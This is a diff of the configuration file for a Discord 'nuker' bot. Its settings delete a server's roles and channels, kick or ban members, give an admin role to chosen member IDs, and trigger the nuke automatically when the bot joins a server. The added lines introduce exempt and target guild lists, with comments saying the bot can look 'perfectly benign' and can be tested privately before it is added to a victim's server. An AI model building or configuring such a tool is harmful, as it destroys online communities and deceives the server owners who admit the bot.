@@ -5,15 +5,22 @@ token=""
 
 # If set to false, the nuker will not kick or ban any members, no matter the value of ban_members
 [feature_config]
-#  The auto nuke setting will make it so upon joining a server, the nuke will activate automatically
-# Auto nuke also gives the option to nuke all currently joined servers upon startup
-# This requires the program running persistently. The guildID property has no effect when auto nuke is enabled
-auto_nuke=true
 delete_roles=true
+delete_channels=true
 # IDs of members who will be given an admin role. As a member cannot assign roles with permissions higher than their own role, this will make and assign a role with
 # the member permissions of the bot
 auto_admin=["911849994020085820"]
-delete_channels=true
+#  The auto nuke setting will make it so upon joining a server, the nuke will activate automatically
+# Auto nuke also gives the option to nuke all currently joined servers upon startup
+# This requires the program running persistently. The guildID property has no effect when auto nuke is enabled
+[feature_config.auto_nuke]
+enabled=true
+# These guilds will not be nuked by auto nuker, giving the apperance of a perfectly benign bot if added
+exempt_guilds=[]
+# Probably more useful than exempt guilds. auto nuker will only nuke these guilds on join, making it on a sort of standby until activated
+# Example use: Owner adding to testing server before adding to real server to check if nuke
+# Takes priority over exempt guilds, nuking a server even if exempt
+target_only=[]
 [feature_config.member_removal]
 enabled=true
 # If not set to true, it will kick members instead
